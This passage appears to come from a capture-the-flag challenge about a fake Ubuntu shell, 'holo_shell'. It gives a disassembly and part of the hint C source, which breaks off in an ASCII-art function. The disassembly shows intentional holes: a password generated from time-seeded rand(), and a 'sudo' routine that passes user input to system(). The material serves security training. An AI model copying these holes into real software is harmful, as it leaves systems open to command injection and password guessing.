    12f1:	48 83 ec 10          	sub    rsp,0x10
    12f5:	48 8b 05 34 3d 00 00 	mov    rax,QWORD PTR [rip+0x3d34]        # 5030 <stdin@@GLIBC_2.2.5>
    12fc:	b9 00 00 00 00       	mov    ecx,0x0
    1301:	ba 02 00 00 00       	mov    edx,0x2
    1306:	be 00 00 00 00       	mov    esi,0x0
    130b:	48 89 c7             	mov    rdi,rax
    130e:	e8 bd fe ff ff       	call   11d0 <setvbuf@plt>
    1313:	48 8b 05 06 3d 00 00 	mov    rax,QWORD PTR [rip+0x3d06]        # 5020 <stdout@@GLIBC_2.2.5>
    131a:	b9 00 00 00 00       	mov    ecx,0x0
    131f:	ba 02 00 00 00       	mov    edx,0x2
    1324:	be 00 00 00 00       	mov    esi,0x0
    1329:	48 89 c7             	mov    rdi,rax
    132c:	e8 9f fe ff ff       	call   11d0 <setvbuf@plt>
    1331:	48 8b 05 08 3d 00 00 	mov    rax,QWORD PTR [rip+0x3d08]        # 5040 <stderr@@GLIBC_2.2.5>
    1338:	b9 00 00 00 00       	mov    ecx,0x0
    133d:	ba 02 00 00 00       	mov    edx,0x2
    1342:	be 00 00 00 00       	mov    esi,0x0
    1347:	48 89 c7             	mov    rdi,rax
    134a:	e8 81 fe ff ff       	call   11d0 <setvbuf@plt>
    134f:	bf 00 00 00 00       	mov    edi,0x0
    1354:	e8 57 fe ff ff       	call   11b0 <time@plt>
    1359:	89 c7                	mov    edi,eax
    135b:	e8 40 fe ff ff       	call   11a0 <srand@plt>
    1360:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
    1367:	eb 40                	jmp    13a9 <init+0xc0>
    1369:	e8 82 fe ff ff       	call   11f0 <rand@plt>
    136e:	48 63 d0             	movsxd rdx,eax
    1371:	48 69 d2 5d 41 4c ae 	imul   rdx,rdx,0xffffffffae4c415d
    1378:	48 c1 ea 20          	shr    rdx,0x20
    137c:	01 c2                	add    edx,eax
    137e:	89 d1                	mov    ecx,edx
    1380:	c1 f9 06             	sar    ecx,0x6
    1383:	99                   	cdq    
    1384:	29 d1                	sub    ecx,edx
    1386:	89 ca                	mov    edx,ecx
    1388:	6b d2 5e             	imul   edx,edx,0x5e
    138b:	29 d0                	sub    eax,edx
    138d:	89 c2                	mov    edx,eax
    138f:	89 d0                	mov    eax,edx
    1391:	83 c0 22             	add    eax,0x22
    1394:	89 c1                	mov    ecx,eax
    1396:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
    1399:	48 98                	cdqe   
    139b:	48 8d 15 ae 3c 00 00 	lea    rdx,[rip+0x3cae]        # 5050 <passwd>
    13a2:	88 0c 10             	mov    BYTE PTR [rax+rdx*1],cl
    13a5:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
    13a9:	83 7d fc 09          	cmp    DWORD PTR [rbp-0x4],0x9
    13ad:	7e ba                	jle    1369 <init+0x80>
    13af:	90                   	nop
    13b0:	90                   	nop
    13b1:	c9                   	leave  
    13b2:	c3                   	ret    

00000000000013b3 <login_info>:
    13b3:	f3 0f 1e fa          	endbr64 
    13b7:	55                   	push   rbp
    13b8:	48 89 e5             	mov    rbp,rsp
    13bb:	48 8d 3d 46 0c 00 00 	lea    rdi,[rip+0xc46]        # 2008 <_IO_stdin_used+0x8>
    13c2:	e8 79 fd ff ff       	call   1140 <puts@plt>
    13c7:	48 8d 3d 7d 0c 00 00 	lea    rdi,[rip+0xc7d]        # 204b <_IO_stdin_used+0x4b>
    13ce:	e8 6d fd ff ff       	call   1140 <puts@plt>
    13d3:	48 8d 3d 76 0c 00 00 	lea    rdi,[rip+0xc76]        # 2050 <_IO_stdin_used+0x50>
    13da:	e8 61 fd ff ff       	call   1140 <puts@plt>
    13df:	48 8d 3d 9a 0c 00 00 	lea    rdi,[rip+0xc9a]        # 2080 <_IO_stdin_used+0x80>
    13e6:	e8 55 fd ff ff       	call   1140 <puts@plt>
    13eb:	48 8d 3d c6 0c 00 00 	lea    rdi,[rip+0xcc6]        # 20b8 <_IO_stdin_used+0xb8>
    13f2:	e8 49 fd ff ff       	call   1140 <puts@plt>
    13f7:	48 8d 3d 4d 0c 00 00 	lea    rdi,[rip+0xc4d]        # 204b <_IO_stdin_used+0x4b>
    13fe:	e8 3d fd ff ff       	call   1140 <puts@plt>
    1403:	48 8d 3d de 0c 00 00 	lea    rdi,[rip+0xcde]        # 20e8 <_IO_stdin_used+0xe8>
    140a:	e8 31 fd ff ff       	call   1140 <puts@plt>
    140f:	48 8d 3d 02 0d 00 00 	lea    rdi,[rip+0xd02]        # 2118 <_IO_stdin_used+0x118>
    1416:	e8 25 fd ff ff       	call   1140 <puts@plt>
    141b:	48 8d 3d 26 0d 00 00 	lea    rdi,[rip+0xd26]        # 2148 <_IO_stdin_used+0x148>
    1422:	e8 19 fd ff ff       	call   1140 <puts@plt>
    1427:	48 8d 3d 1d 0c 00 00 	lea    rdi,[rip+0xc1d]        # 204b <_IO_stdin_used+0x4b>
    142e:	e8 0d fd ff ff       	call   1140 <puts@plt>
    1433:	48 8d 3d 4e 0d 00 00 	lea    rdi,[rip+0xd4e]        # 2188 <_IO_stdin_used+0x188>
    143a:	e8 01 fd ff ff       	call   1140 <puts@plt>
    143f:	90                   	nop
    1440:	5d                   	pop    rbp
    1441:	c3                   	ret    

0000000000001442 <ls>:
    1442:	f3 0f 1e fa          	endbr64 
    1446:	55                   	push   rbp
    1447:	48 89 e5             	mov    rbp,rsp
    144a:	48 8d 3d 7b 0d 00 00 	lea    rdi,[rip+0xd7b]        # 21cc <_IO_stdin_used+0x1cc>
    1451:	e8 ea fc ff ff       	call   1140 <puts@plt>
    1456:	90                   	nop
    1457:	5d                   	pop    rbp
    1458:	c3                   	ret    

0000000000001459 <cat>:
    1459:	f3 0f 1e fa          	endbr64 
    145d:	55                   	push   rbp
    145e:	48 89 e5             	mov    rbp,rsp
    1461:	48 8d 3d 88 0d 00 00 	lea    rdi,[rip+0xd88]        # 21f0 <_IO_stdin_used+0x1f0>
    1468:	e8 d3 fc ff ff       	call   1140 <puts@plt>
    146d:	48 8d 3d 7c 0d 00 00 	lea    rdi,[rip+0xd7c]        # 21f0 <_IO_stdin_used+0x1f0>
    1474:	e8 c7 fc ff ff       	call   1140 <puts@plt>
    1479:	48 8d 3d 70 0d 00 00 	lea    rdi,[rip+0xd70]        # 21f0 <_IO_stdin_used+0x1f0>
    1480:	e8 bb fc ff ff       	call   1140 <puts@plt>
    1485:	48 8d 3d 64 0d 00 00 	lea    rdi,[rip+0xd64]        # 21f0 <_IO_stdin_used+0x1f0>
    148c:	e8 af fc ff ff       	call   1140 <puts@plt>
    1491:	48 8d 3d 58 0d 00 00 	lea    rdi,[rip+0xd58]        # 21f0 <_IO_stdin_used+0x1f0>
    1498:	e8 a3 fc ff ff       	call   1140 <puts@plt>
    149d:	48 8d 3d 4c 0d 00 00 	lea    rdi,[rip+0xd4c]        # 21f0 <_IO_stdin_used+0x1f0>
    14a4:	e8 97 fc ff ff       	call   1140 <puts@plt>
    14a9:	48 8d 3d d8 0d 00 00 	lea    rdi,[rip+0xdd8]        # 2288 <_IO_stdin_used+0x288>
    14b0:	e8 8b fc ff ff       	call   1140 <puts@plt>
    14b5:	48 8d 3d 64 0e 00 00 	lea    rdi,[rip+0xe64]        # 2320 <_IO_stdin_used+0x320>
    14bc:	e8 7f fc ff ff       	call   1140 <puts@plt>
    14c1:	48 8d 3d f0 0e 00 00 	lea    rdi,[rip+0xef0]        # 23b8 <_IO_stdin_used+0x3b8>
    14c8:	e8 73 fc ff ff       	call   1140 <puts@plt>
    14cd:	48 8d 3d 7c 0f 00 00 	lea    rdi,[rip+0xf7c]        # 2450 <_IO_stdin_used+0x450>
    14d4:	e8 67 fc ff ff       	call   1140 <puts@plt>
    14d9:	48 8d 3d 08 10 00 00 	lea    rdi,[rip+0x1008]        # 24e8 <_IO_stdin_used+0x4e8>
    14e0:	e8 5b fc ff ff       	call   1140 <puts@plt>
    14e5:	48 8d 3d 94 10 00 00 	lea    rdi,[rip+0x1094]        # 2580 <_IO_stdin_used+0x580>
    14ec:	e8 4f fc ff ff       	call   1140 <puts@plt>
    14f1:	48 8d 3d 20 11 00 00 	lea    rdi,[rip+0x1120]        # 2618 <_IO_stdin_used+0x618>
    14f8:	e8 43 fc ff ff       	call   1140 <puts@plt>
    14fd:	48 8d 3d ac 11 00 00 	lea    rdi,[rip+0x11ac]        # 26b0 <_IO_stdin_used+0x6b0>
    1504:	e8 37 fc ff ff       	call   1140 <puts@plt>
    1509:	48 8d 3d 38 12 00 00 	lea    rdi,[rip+0x1238]        # 2748 <_IO_stdin_used+0x748>
    1510:	e8 2b fc ff ff       	call   1140 <puts@plt>
    1515:	48 8d 3d c4 12 00 00 	lea    rdi,[rip+0x12c4]        # 27e0 <_IO_stdin_used+0x7e0>
    151c:	e8 1f fc ff ff       	call   1140 <puts@plt>
    1521:	48 8d 3d 50 13 00 00 	lea    rdi,[rip+0x1350]        # 2878 <_IO_stdin_used+0x878>
    1528:	e8 13 fc ff ff       	call   1140 <puts@plt>
    152d:	48 8d 3d dc 13 00 00 	lea    rdi,[rip+0x13dc]        # 2910 <_IO_stdin_used+0x910>
    1534:	e8 07 fc ff ff       	call   1140 <puts@plt>
    1539:	48 8d 3d 68 14 00 00 	lea    rdi,[rip+0x1468]        # 29a8 <_IO_stdin_used+0x9a8>
    1540:	e8 fb fb ff ff       	call   1140 <puts@plt>
    1545:	48 8d 3d f4 14 00 00 	lea    rdi,[rip+0x14f4]        # 2a40 <_IO_stdin_used+0xa40>
    154c:	e8 ef fb ff ff       	call   1140 <puts@plt>
    1551:	48 8d 3d 80 15 00 00 	lea    rdi,[rip+0x1580]        # 2ad8 <_IO_stdin_used+0xad8>
    1558:	e8 e3 fb ff ff       	call   1140 <puts@plt>
    155d:	48 8d 3d 0c 16 00 00 	lea    rdi,[rip+0x160c]        # 2b70 <_IO_stdin_used+0xb70>
    1564:	e8 d7 fb ff ff       	call   1140 <puts@plt>
    1569:	48 8d 3d 80 0c 00 00 	lea    rdi,[rip+0xc80]        # 21f0 <_IO_stdin_used+0x1f0>
    1570:	e8 cb fb ff ff       	call   1140 <puts@plt>
    1575:	48 8d 3d 74 0c 00 00 	lea    rdi,[rip+0xc74]        # 21f0 <_IO_stdin_used+0x1f0>
    157c:	e8 bf fb ff ff       	call   1140 <puts@plt>
    1581:	48 8d 3d 68 0c 00 00 	lea    rdi,[rip+0xc68]        # 21f0 <_IO_stdin_used+0x1f0>
    1588:	e8 b3 fb ff ff       	call   1140 <puts@plt>
    158d:	90                   	nop
    158e:	5d                   	pop    rbp
    158f:	c3                   	ret    

0000000000001590 <sudo>:
    1590:	f3 0f 1e fa          	endbr64 
    1594:	55                   	push   rbp
    1595:	48 89 e5             	mov    rbp,rsp
    1598:	48 83 ec 20          	sub    rsp,0x20
    159c:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    15a3:	00 00 
    15a5:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    15a9:	31 c0                	xor    eax,eax
    15ab:	ba 1b 00 00 00       	mov    edx,0x1b
    15b0:	48 8d 35 50 16 00 00 	lea    rsi,[rip+0x1650]        # 2c07 <_IO_stdin_used+0xc07>
    15b7:	bf 01 00 00 00       	mov    edi,0x1
    15bc:	e8 8f fb ff ff       	call   1150 <write@plt>
    15c1:	48 8d 45 ee          	lea    rax,[rbp-0x12]
    15c5:	ba 0a 00 00 00       	mov    edx,0xa
    15ca:	48 89 c6             	mov    rsi,rax
    15cd:	bf 00 00 00 00       	mov    edi,0x0
    15d2:	e8 b9 fb ff ff       	call   1190 <read@plt>
    15d7:	48 8d 45 ee          	lea    rax,[rbp-0x12]
    15db:	ba 0a 00 00 00       	mov    edx,0xa
    15e0:	48 8d 35 69 3a 00 00 	lea    rsi,[rip+0x3a69]        # 5050 <passwd>
    15e7:	48 89 c7             	mov    rdi,rax
    15ea:	e8 41 fb ff ff       	call   1130 <strncmp@plt>
    15ef:	85 c0                	test   eax,eax
    15f1:	0f 85 98 00 00 00    	jne    168f <sudo+0xff>
    15f7:	48 8d 3d 2a 16 00 00 	lea    rdi,[rip+0x162a]        # 2c28 <_IO_stdin_used+0xc28>
    15fe:	e8 3d fb ff ff       	call   1140 <puts@plt>
    1603:	48 8d 3d 46 16 00 00 	lea    rdi,[rip+0x1646]        # 2c50 <_IO_stdin_used+0xc50>
    160a:	e8 31 fb ff ff       	call   1140 <puts@plt>
    160f:	ba 02 00 00 00       	mov    edx,0x2
    1614:	48 8d 35 6e 16 00 00 	lea    rsi,[rip+0x166e]        # 2c89 <_IO_stdin_used+0xc89>
    161b:	bf 01 00 00 00       	mov    edi,0x1
    1620:	e8 2b fb ff ff       	call   1150 <write@plt>
    1625:	48 8d 45 ee          	lea    rax,[rbp-0x12]
    1629:	ba 0a 00 00 00       	mov    edx,0xa
    162e:	be 00 00 00 00       	mov    esi,0x0
    1633:	48 89 c7             	mov    rdi,rax
    1636:	e8 45 fb ff ff       	call   1180 <memset@plt>
    163b:	48 8d 45 ee          	lea    rax,[rbp-0x12]
    163f:	ba 0a 00 00 00       	mov    edx,0xa
    1644:	48 89 c6             	mov    rsi,rax
    1647:	bf 00 00 00 00       	mov    edi,0x0
    164c:	e8 3f fb ff ff       	call   1190 <read@plt>
    1651:	48 8d 55 ee          	lea    rdx,[rbp-0x12]
    1655:	48 8d 45 e0          	lea    rax,[rbp-0x20]
    1659:	48 8d 35 2c 16 00 00 	lea    rsi,[rip+0x162c]        # 2c8c <_IO_stdin_used+0xc8c>
    1660:	48 89 c7             	mov    rdi,rax
    1663:	b8 00 00 00 00       	mov    eax,0x0
    1668:	e8 53 fb ff ff       	call   11c0 <asprintf@plt>
    166d:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
    1671:	48 89 c7             	mov    rdi,rax
    1674:	e8 f7 fa ff ff       	call   1170 <system@plt>
    1679:	48 8b 45 e0          	mov    rax,QWORD PTR [rbp-0x20]
    167d:	48 89 c7             	mov    rdi,rax
    1680:	e8 9b fa ff ff       	call   1120 <free@plt>
    1685:	48 c7 45 e0 00 00 00 	mov    QWORD PTR [rbp-0x20],0x0
    168c:	00 
    168d:	eb 0c                	jmp    169b <sudo+0x10b>
    168f:	48 8d 3d 12 16 00 00 	lea    rdi,[rip+0x1612]        # 2ca8 <_IO_stdin_used+0xca8>
    1696:	e8 a5 fa ff ff       	call   1140 <puts@plt>
    169b:	90                   	nop
    169c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    16a0:	64 48 33 04 25 28 00 	xor    rax,QWORD PTR fs:0x28
    16a7:	00 00 
    16a9:	74 05                	je     16b0 <sudo+0x120>
    16ab:	e8 b0 fa ff ff       	call   1160 <__stack_chk_fail@plt>
    16b0:	c9                   	leave  
    16b1:	c3                   	ret    

00000000000016b2 <parse_command>:
    16b2:	f3 0f 1e fa          	endbr64 
    16b6:	55                   	push   rbp
    16b7:	48 89 e5             	mov    rbp,rsp
    16ba:	48 83 ec 10          	sub    rsp,0x10
    16be:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
    16c2:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    16c6:	ba 03 00 00 00       	mov    edx,0x3
    16cb:	48 8d 35 f9 15 00 00 	lea    rsi,[rip+0x15f9]        # 2ccb <_IO_stdin_used+0xccb>
    16d2:	48 89 c7             	mov    rdi,rax
    16d5:	e8 56 fa ff ff       	call   1130 <strncmp@plt>
    16da:	85 c0                	test   eax,eax
    16dc:	75 0f                	jne    16ed <parse_command+0x3b>
    16de:	b8 00 00 00 00       	mov    eax,0x0
    16e3:	e8 71 fd ff ff       	call   1459 <cat>
    16e8:	e9 82 00 00 00       	jmp    176f <parse_command+0xbd>
    16ed:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    16f1:	ba 02 00 00 00       	mov    edx,0x2
    16f6:	48 8d 35 d2 15 00 00 	lea    rsi,[rip+0x15d2]        # 2ccf <_IO_stdin_used+0xccf>
    16fd:	48 89 c7             	mov    rdi,rax
    1700:	e8 2b fa ff ff       	call   1130 <strncmp@plt>
    1705:	85 c0                	test   eax,eax
    1707:	75 0c                	jne    1715 <parse_command+0x63>
    1709:	b8 00 00 00 00       	mov    eax,0x0
    170e:	e8 2f fd ff ff       	call   1442 <ls>
    1713:	eb 5a                	jmp    176f <parse_command+0xbd>
    1715:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    1719:	ba 07 00 00 00       	mov    edx,0x7
    171e:	48 8d 35 ad 15 00 00 	lea    rsi,[rip+0x15ad]        # 2cd2 <_IO_stdin_used+0xcd2>
    1725:	48 89 c7             	mov    rdi,rax
    1728:	e8 03 fa ff ff       	call   1130 <strncmp@plt>
    172d:	85 c0                	test   eax,eax
    172f:	75 0c                	jne    173d <parse_command+0x8b>
    1731:	b8 00 00 00 00       	mov    eax,0x0
    1736:	e8 55 fe ff ff       	call   1590 <sudo>
    173b:	eb 32                	jmp    176f <parse_command+0xbd>
    173d:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
    1741:	ba 04 00 00 00       	mov    edx,0x4
    1746:	48 8d 35 8d 15 00 00 	lea    rsi,[rip+0x158d]        # 2cda <_IO_stdin_used+0xcda>
    174d:	48 89 c7             	mov    rdi,rax
    1750:	e8 db f9 ff ff       	call   1130 <strncmp@plt>
    1755:	85 c0                	test   eax,eax
    1757:	75 0a                	jne    1763 <parse_command+0xb1>
    1759:	bf 00 00 00 00       	mov    edi,0x0
    175e:	e8 7d fa ff ff       	call   11e0 <exit@plt>
    1763:	48 8d 3d 75 15 00 00 	lea    rdi,[rip+0x1575]        # 2cdf <_IO_stdin_used+0xcdf>
    176a:	e8 d1 f9 ff ff       	call   1140 <puts@plt>
    176f:	90                   	nop
    1770:	c9                   	leave  
    1771:	c3                   	ret    

0000000000001772 <main>:
    1772:	f3 0f 1e fa          	endbr64 
    1776:	55                   	push   rbp
    1777:	48 89 e5             	mov    rbp,rsp
    177a:	48 83 ec 20          	sub    rsp,0x20
    177e:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
    1785:	00 00 
    1787:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
    178b:	31 c0                	xor    eax,eax
    178d:	b8 00 00 00 00       	mov    eax,0x0
    1792:	e8 52 fb ff ff       	call   12e9 <init>
    1797:	b8 00 00 00 00       	mov    eax,0x0
    179c:	e8 12 fc ff ff       	call   13b3 <login_info>
    17a1:	ba 12 00 00 00       	mov    edx,0x12
    17a6:	48 8d 35 4c 15 00 00 	lea    rsi,[rip+0x154c]        # 2cf9 <_IO_stdin_used+0xcf9>
    17ad:	bf 01 00 00 00       	mov    edi,0x1
    17b2:	e8 99 f9 ff ff       	call   1150 <write@plt>
    17b7:	48 8d 45 e0          	lea    rax,[rbp-0x20]
    17bb:	ba 10 00 00 00       	mov    edx,0x10
    17c0:	48 89 c6             	mov    rsi,rax
    17c3:	bf 00 00 00 00       	mov    edi,0x0
    17c8:	e8 c3 f9 ff ff       	call   1190 <read@plt>
    17cd:	48 8d 45 e0          	lea    rax,[rbp-0x20]
    17d1:	48 89 c7             	mov    rdi,rax
    17d4:	e8 d9 fe ff ff       	call   16b2 <parse_command>
    17d9:	eb c6                	jmp    17a1 <main+0x2f>
    17db:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000017e0 <__libc_csu_init>:
    17e0:	f3 0f 1e fa          	endbr64 
    17e4:	41 57                	push   r15
    17e6:	4c 8d 3d 63 35 00 00 	lea    r15,[rip+0x3563]        # 4d50 <__frame_dummy_init_array_entry>
    17ed:	41 56                	push   r14
    17ef:	49 89 d6             	mov    r14,rdx
    17f2:	41 55                	push   r13
    17f4:	49 89 f5             	mov    r13,rsi
    17f7:	41 54                	push   r12
    17f9:	41 89 fc             	mov    r12d,edi
    17fc:	55                   	push   rbp
    17fd:	48 8d 2d 54 35 00 00 	lea    rbp,[rip+0x3554]        # 4d58 <__do_global_dtors_aux_fini_array_entry>
    1804:	53                   	push   rbx
    1805:	4c 29 fd             	sub    rbp,r15
    1808:	48 83 ec 08          	sub    rsp,0x8
    180c:	e8 ef f7 ff ff       	call   1000 <_init>
    1811:	48 c1 fd 03          	sar    rbp,0x3
    1815:	74 1f                	je     1836 <__libc_csu_init+0x56>
    1817:	31 db                	xor    ebx,ebx
    1819:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
    1820:	4c 89 f2             	mov    rdx,r14
    1823:	4c 89 ee             	mov    rsi,r13
    1826:	44 89 e7             	mov    edi,r12d
    1829:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
    182d:	48 83 c3 01          	add    rbx,0x1
    1831:	48 39 dd             	cmp    rbp,rbx
    1834:	75 ea                	jne    1820 <__libc_csu_init+0x40>
    1836:	48 83 c4 08          	add    rsp,0x8
    183a:	5b                   	pop    rbx
    183b:	5d                   	pop    rbp
    183c:	41 5c                	pop    r12
    183e:	41 5d                	pop    r13
    1840:	41 5e                	pop    r14
    1842:	41 5f                	pop    r15
    1844:	c3                   	ret    
    1845:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
    184c:	00 00 00 00 

0000000000001850 <__libc_csu_fini>:
    1850:	f3 0f 1e fa          	endbr64 
    1854:	c3                   	ret    

Disassembly of section .fini:

0000000000001858 <_fini>:
    1858:	f3 0f 1e fa          	endbr64 
    185c:	48 83 ec 08          	sub    rsp,0x8
    1860:	48 83 c4 08          	add    rsp,0x8
    1864:	c3                   	ret    

```
</details>
<details>
<summary>hint code</summary>

```c
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

char passwd[10];

void init()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    srand(time(0));
    for (int i = 0; i < 10; i++)
    {
        passwd[i] = 33 + (rand() % (126 - 32) + 1);
    }
}

void login_info()
{
    puts("Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.11.0-36-generic x86_64)");
    puts("");
    puts("* Documentation:  https://help.ubuntu.com");
    puts("* Management:     https://landscape.canonical.com");
    puts("* Support:        https://ubuntu.com/advantage");
    puts("");
    puts("183 updates can be installed immediately.");
    puts("0 of these updates are security updates.");
    puts("To see these additional updates run: apt list --upgradable");
    puts("");
    puts("Your Hardware Enablement Stack (HWE) is supported until April 2025.");
}

void ls()
{
    puts("holo_shell holo_shell.c flag");
}

void cat()
{
    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠎⠓⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠎⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠱⡀⠀⠀⣀⣀⣀⣀⣠⠤⠤⠤⢤⣀⣀⠀⠀⠀⡎⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠸⠀⠾⠓⢠⢜⣍⡿⣫⣷⣐⡄⠀⠀⠀⠀⠀⠀⡸⢏⣛⣶⣞⢹⡠⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⣠⠔⠃⠀⠀⢿⣮⢧⣿⣿⠿⢝⠇⠀⠀⠀⠀⠀⢸⢁⢯⣿⣞⡽⢹⠇⠈⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⡴⠁⠀⠀⠀⠀⠈⠈⠂⠭⠭⠐⠉⢠⣖⡆⠀⠀⠀⠀⠀⢉⣙⠋⠦⠋⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⡠⡀⠀⠀⠀⠉⠀⠀⢀⠔⡆⠀⠀⠀⠀⠀⠒⠒⠒⢻⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⢸⠤⠴⠒⠀⠀⠀⠀⠀⠀⢹⠙⣄⡀⠀⢀⣠⠴⠋⢰⠇⠀⠀⠀⠀⠀⠀⠀⢀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠈⣷⠖⠋⣡⠀⠀⠀⠀⠀⢸⡄⠀⠉⠉⠉⠀⠀⢀⡞⠀⠀⠀⠀⠀⠤⣄⣀⠜⠁⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢱⡄⠀⠀⠀⠀");
    puts("⠀⠀⠈⠀⠘⠶⣞⡁⡀⠀⠀⠀⠀⠀⠹⢦⣀⡀⠀⢀⣠⠎⠀⠀⠀⠀⠀⠀⣀⠔⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⡄⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠒⢲⠒⠶⠶⠶⠾⠿⠯⠭⢤⣤⣤⠤⠴⠶⠖⠋⠑⠒⠢⠤⠤⠤⠀⣀⣀⣀⣀⣀⠀⠀⠀⠀⢀⠁⡇⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⠊⠀⡇⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⡰⠁⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠒⠒⠒⠂⠀⠤⠤⠤⠤⠤⠤⠤⠀⠀⠀⡀⠀⠀⢀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⢠⢻⠀⢠⢧⢠⣇⠀⠀⢠⠤⠒⠉⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡄⠎⠀⣄⡆⠘⠾⠈⡄⢀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀");
    puts("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠘⠀⠀⠀⠀⠘⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀");
